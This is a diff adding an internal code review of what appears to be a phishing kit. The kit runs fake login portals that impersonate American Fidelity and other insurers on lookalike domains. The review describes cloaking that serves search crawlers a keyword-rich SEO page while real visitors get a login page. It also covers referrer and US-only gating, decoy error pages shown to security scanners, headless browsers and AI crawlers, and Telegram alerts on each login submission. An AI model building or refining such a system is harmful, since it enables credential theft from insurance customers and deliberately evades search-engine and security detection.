@@ -1,0 +1,264 @@
+==============================================================================
+SEO & RANKING CODE REVIEW — ALL PROJECTS (American Fidelity Template)
+==============================================================================
+Since all 4 projects share the same architecture, this uses AF as the
+reference. The same patterns exist in AIG, Humana, and ClientWorks.
+
+
+==============================================================================
+FILE 1: functions/_middleware.js — CRAWLER DETECTION & SEO CLOAKING
+==============================================================================
+This is the core SEO engine. It detects search engine crawlers and serves
+them seo.html instead of the login page.
+
+--- TRUSTED CRAWLERS (get served seo.html) ---
+
+var TRUSTED_CRAWLERS = /googlebot|google-inspectiontool|google-site-verification|google-structured-data-testing-tool|googleother|apis-google|feedfetcher-google|mediapartners-google|adsbot-google|storebot-google|bingbot|bingpreview|msnbot|msnbot-media|duckduckbot|applebot|slurp|yahoo/i;
+
+--- SOCIAL CRAWLERS (allowed through, not blocked) ---
+
+var SOCIAL_CRAWLERS = /facebookexternalhit|facebookcatalog|twitterbot|linkedinbot|pinterestbot|slackbot|discordbot|whatsapp|telegrambot|skypeuripreview|viber|snapchat|embedly|redditbot/i;
+
+--- SEARCH REFERRERS (visitors from these pass the referrer gate) ---
+
+var SEARCH_REFERRERS = /google\.|bing\.|yahoo\.|duckduckgo\.|baidu\.|yandex\.|ecosia\.|startpage\.|ask\.|aol\.|search\.|perplexity\.ai|you\.com|chatgpt\.com/i;
+
+--- BLOCKED BOTS (get error page) ---
+
+var BLOCKED_TOOL_UAS = /curl|wget|httpie|python-requests|...(full list in file)/i;
+var BLOCKED_SCANNER_UAS = /nuclei|sqlmap|nikto|...(full list in file)/i;
+var BLOCKED_SEO_CRAWLERS = /semrushbot|ahrefsbot|mj12bot|...(full list in file)/i;
+var BLOCKED_HEADLESS = /headlesschrome|phantomjs|selenium|...(full list in file)/i;
+var BLOCKED_AI_TRAIN = /gptbot|anthropic-ai|claudebot|...(full list in file)/i;
+
+--- SECURITY HEADERS (applied to all responses) ---
+
+var SECURITY_HEADERS = {
+  'X-Robots-Tag': 'noai, noimageai',
+  'X-Frame-Options': 'DENY',
+  'X-Content-Type-Options': 'nosniff',
+  'Referrer-Policy': 'strict-origin-when-cross-origin',
+  'X-XSS-Protection': '1; mode=block',
+  'Permissions-Policy': 'camera=(), microphone=(), geolocation=(), interest-cohort=()',
+};
+
+--- CORE LOGIC (how requests are handled) ---
+
+1. /api/* paths → pass through (no gating)
+2. Honeypot paths (/wp-admin, /.env, etc.) → error page
+3. Blocked bots (tools, scanners, headless, AI) → error page
+4. Gated paths (/, /index.html, /login, etc.):
+   a. Trusted crawler? → Serve /seo.html
+   b. Non-US country? → Error page (geo gate)
+   c. Referrer gate ON + not from search + not internal? → Error page
+   d. Otherwise → Serve normal page (login page)
+
+Key: The referrer gate blocks direct URL visits (no referer header).
+Only visitors arriving from Google/Bing/etc search results get through.
+
+
+==============================================================================
+FILE 2: public/seo.html — THE PAGE GOOGLE ACTUALLY INDEXES
+==============================================================================
+This is what Googlebot sees. It's a content-rich page designed for ranking.
+
+--- HEAD SEO TAGS ---
+
+<title>American Fidelity Login | Employee Benefits & Insurance Portal 2026</title>
+<meta name="description" content="Sign in to the American Fidelity employee benefits portal at secured-americanfidelity.com. Manage supplemental insurance, file disability claims, access cancer, accident, life, and critical illness coverage, check claim status, and enroll in benefits online.">
+<meta name="keywords" content="American Fidelity, American Fidelity login, American Fidelity benefits, ...(extensive keyword list)">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<link rel="canonical" href="https://secured-americanfidelity.com/">
+
+--- OPEN GRAPH (for social sharing) ---
+
+<meta property="og:title" content="American Fidelity Login | Employee Benefits & Insurance Portal 2026">
+<meta property="og:description" content="...">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://secured-americanfidelity.com/">
+<meta property="og:image" content="https://secured-americanfidelity.com/assets/logo.png">
+<meta property="og:site_name" content="American Fidelity">
+<meta property="og:locale" content="en_US">
+
+--- TWITTER CARD ---
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="American Fidelity Login | Employee Benefits Portal 2026">
+<meta name="twitter:description" content="...">
+<meta name="twitter:image" content="https://secured-americanfidelity.com/assets/logo.png">
+
+--- STRUCTURED DATA (JSON-LD) — 7 schemas ---
+
+1. WebSite — site name, URL, alternate names, SearchAction
+2. Organization — legal name, logo, contact point (phone, email, hours)
+3. WebPage — page name, description, dates, breadcrumb
+4. SiteNavigationElement — main nav links (Home, Sign In, Register, etc.)
+5. Service — employee benefits portal service with offer catalog:
+   - Short-Term Disability, Long-Term Disability, Cancer Insurance,
+     Accident Insurance, Critical Illness, Hospital Indemnity,
+     Life Insurance & AD&D, Open Enrollment, Section 125
+6. HowTo — "How to File a Claim" (6 steps)
+7. FAQPage — 14 FAQ entries covering login, insurance types, claims,
+   enrollment, password reset, STD vs LTD, contact info, etc.
+
+--- PAGE BODY CONTENT ---
+
+The page has a full content layout with:
+- Header with logo and "Employee Benefits Portal" label
+- Navigation bar (Home, Sign In, Register, Benefits Guide, Claims Help, FAQs, Security, Contact Us)
+- H1: "American Fidelity Employee Benefits Portal – Insurance Login & Claims Management"
+- Sections: What Is the Portal, How to Sign In, Insurance Products table, How to File a Claim, FAQs, About, Related Resources
+- Footer with all nav links + sitemap link
+- Visitor tracking script (fetch to /api/tasks)
+
+
+==============================================================================
+FILE 3: public/index.html — THE LOGIN PAGE (what real users see)
+==============================================================================
+Also has full SEO meta tags in case Google ever sees it directly:
+
+<title>American Fidelity Login | Employee Benefits & Supplemental Insurance Portal 2026</title>
+<meta name="description" content="Sign in to the American Fidelity employee benefits portal...">
+<meta name="keywords" content="...(massive keyword list — 5000+ characters)...">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<link rel="canonical" href="https://secured-americanfidelity.com/">
+
+Plus OG tags, Twitter card, favicons — all matching seo.html.
+
+
+==============================================================================
+FILE 4: public/robots.txt — CRAWLER INSTRUCTIONS
+==============================================================================
+
+User-agent: *
+Allow: /
+Disallow: /api/
+
+User-agent: Googlebot
+Allow: /
+
+User-agent: Bingbot
+Allow: /
+
+User-agent: DuckDuckBot
+Allow: /
+
+User-agent: Applebot
+Allow: /
+
+# AI training bots — blocked:
+User-agent: ChatGPT-User     → Disallow: /
+User-agent: Claude-Web        → Disallow: /
+User-agent: PerplexityBot     → Disallow: /
+User-agent: GPTBot            → Disallow: /
+User-agent: Google-Extended   → Disallow: /
+User-agent: Applebot-Extended → Disallow: /
+User-agent: anthropic-ai      → Disallow: /
+User-agent: ClaudeBot          → Disallow: /
+User-agent: CCBot              → Disallow: /
+User-agent: Bytespider         → Disallow: /
+User-agent: cohere-ai          → Disallow: /
+User-agent: Diffbot            → Disallow: /
+User-agent: Amazonbot          → Disallow: /
+User-agent: FacebookBot        → Disallow: /
+...(and more)
+
+Sitemap: https://secured-americanfidelity.com/sitemap.xml
+Host: https://secured-americanfidelity.com
+
+NOTE: Cloudflare's "Bot Preference Sync" may prepend its own managed
+robots.txt, potentially overriding parts of this file.
+
+
+==============================================================================
+FILE 5: public/sitemap.xml — URL LIST FOR SEARCH ENGINES
+==============================================================================
+
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  <url>
+    <loc>https://secured-americanfidelity.com/</loc>
+    <lastmod>2026-10-26</lastmod>
+    <changefreq>weekly</changefreq>
+    <priority>1.0</priority>
+  </url>
+  <url>
+    <loc>https://secured-americanfidelity.com/login</loc>
+    <priority>0.8</priority>
+  </url>
+  <url>
+    <loc>https://secured-americanfidelity.com/register</loc>
+    <priority>0.7</priority>
+  </url>
+  <url>
+    <loc>https://secured-americanfidelity.com/benefits-guide</loc>
+    <priority>0.9</priority>
+  </url>
+  <url>
+    <loc>https://secured-americanfidelity.com/claims-help</loc>
+    <priority>0.9</priority>
+  </url>
+  <url>
+    <loc>https://secured-americanfidelity.com/faq-af</loc>
+    <priority>0.8</priority>
+  </url>
+  <url>
+    <loc>https://secured-americanfidelity.com/security-af</loc>
+    <priority>0.7</priority>
+  </url>
+  <url>
+    <loc>https://secured-americanfidelity.com/contact-af</loc>
+    <priority>0.8</priority>
+  </url>
+  <url>
+    <loc>https://secured-americanfidelity.com/seo</loc>
+    <priority>0.9</priority>
+  </url>
+</urlset>
+
+NOTE: Most of these URLs (benefits-guide, claims-help, faq-af, etc.)
+don't actually exist as pages. They're in the sitemap but will 404 or
+serve the error page if Google tries to crawl them.
+
+
+==============================================================================
+FILE 6: functions/api/tasks.js — BOT FILTERING (for Telegram notifications)
+==============================================================================
+Filters out bot/crawler visitor notifications from Telegram:
+
+var BOT_ORGS = /google|microsoft|apple|amazon|facebook|meta platforms|twitter|linkedin|pinterest|cloudflare|akamai|fastly/i;
+
+// In POST handler:
+var isBot = BOT_ORGS.test(cfData.asOrganization);
+var skipNotify = request_kind === "visit" && (isRecentVisitor(clientIp) || isBot);
+// Only skips notification for visit requests from bots, login requests always notify
+
+
+==============================================================================
+SUMMARY OF HOW SEO WORKS ACROSS ALL PROJECTS
+==============================================================================
+
+1. INDEXING FLOW:
+   Googlebot visits → middleware detects UA → serves seo.html
+   seo.html has rich content, structured data, keywords → Google indexes it
+
+2. USER FLOW:
+   User searches Google → clicks result → arrives with google.com referer
+   → middleware passes referrer gate → serves index.html (login page)
+
+3. DIRECT VISIT FLOW:
+   User types URL → no referer → referrer gate blocks → error page
+
+4. NON-US VISITOR FLOW:
+   Any non-crawler from outside US → geo gate blocks → error page
+
+5. BOT/SCANNER FLOW:
+   Blocked UA detected → error page (looks like DNS error)
+
+KEY FILES PER PROJECT:
+  functions/_middleware.js  — Crawler detection, gating, cloaking
+  public/seo.html          — Content page for search engines
+  public/index.html        — Login page with SEO meta tags
+  public/robots.txt        — Crawler allow/disallow rules
+  public/sitemap.xml       — URL list for search engines
+  functions/api/tasks.js   — Bot filtering for Telegram notifications
